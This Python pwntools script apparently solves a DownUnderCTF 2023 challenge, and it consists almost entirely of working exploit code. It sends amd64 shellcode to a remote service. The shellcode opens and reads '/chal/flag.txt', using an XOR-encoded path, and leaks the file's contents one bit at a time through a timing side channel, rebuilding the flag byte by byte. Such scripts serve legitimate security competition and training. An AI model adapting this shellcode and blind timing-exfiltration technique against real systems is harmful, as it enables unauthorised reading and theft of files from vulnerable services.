from pwn import *
import time

def get_byte(offset):

    bin_str = ''

    for bit_offset in range(8):

        proc = remote('2023.ductf.dev', 30010)
        proc.recvuntil(b' > ')

        payload = f"""
            mov rax, 0x101010101010101
            push rax
            mov rax, 0x1017579752f6660
            xor [rsp], rax
            mov rax, 0x6c662f6c6168632f
            push rax
            mov rsi, rsp
            xor edx, edx
            xor r10, r10
            push 257
            pop rax
            syscall

            mov rdi, rax
            xor eax, eax
            xor edx, edx
            mov dh, 0x100 >> 8
            mov rsi, rsp
            syscall

            xor r11, r11
            xor rax, rax
            mov al, [rsp+{offset}]
            shr al, {bit_offset}
            shl al, 7
            shr al, 7
            cmp rax, r11
            je end
        loop:
            xor rdi, rdi
            xor eax, eax
            xor edx, edx
            mov dh, 0x100 >> 8
            mov rsi, rsp
            syscall
            jmp loop
        end:
        """

        stage2 = asm(payload, arch='amd64')

        proc.send(stage2)
        start = time.time()
        proc.sendline(b'abc')
        proc.recvall(timeout=1).decode()
        now = time.time()

        if (now - start) > 1:
            bin_str += '1'
        else:
            bin_str += '0'

        proc.close()

    byte = int(bin_str[::-1], 2)

    return byte

key = '{'
flag = 'DUCTF{S1de'
while(key != '}'):
    key = chr(get_byte(len(flag)))
    flag += key
    log.info(f'Flag: {flag}')

print(flag)